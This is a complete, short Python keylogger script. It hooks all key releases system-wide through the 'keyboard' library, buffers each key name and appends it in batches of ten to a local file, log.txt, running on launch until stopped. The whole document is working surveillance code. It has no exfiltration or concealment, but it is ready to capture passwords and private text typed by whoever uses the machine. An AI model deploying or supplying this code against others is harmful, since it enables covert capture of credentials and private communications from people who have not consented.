import keyboard


class Keylogger:


    """
    Initializes the buffer 
    """
    def __init__(self):

        self.buffer = ""


    """
    Entry point.
    """
    def run(self):

        keyboard.on_release(callback=self.onKeyPressed)
        keyboard.wait()
    

    """
    Callback function to record keyboard event and save the resulting buffer into a file.
    """
    def onKeyPressed(self, event):

        self.buffer += "{}\n".format(event.name)

        if len(self.buffer) >= 10:

            with open("log.txt", "a") as logfile:

                logfile.write(self.buffer)
                self.buffer = ""


"""
-----------------------------------------------------
"""
keylogger = Keylogger()
keylogger.run()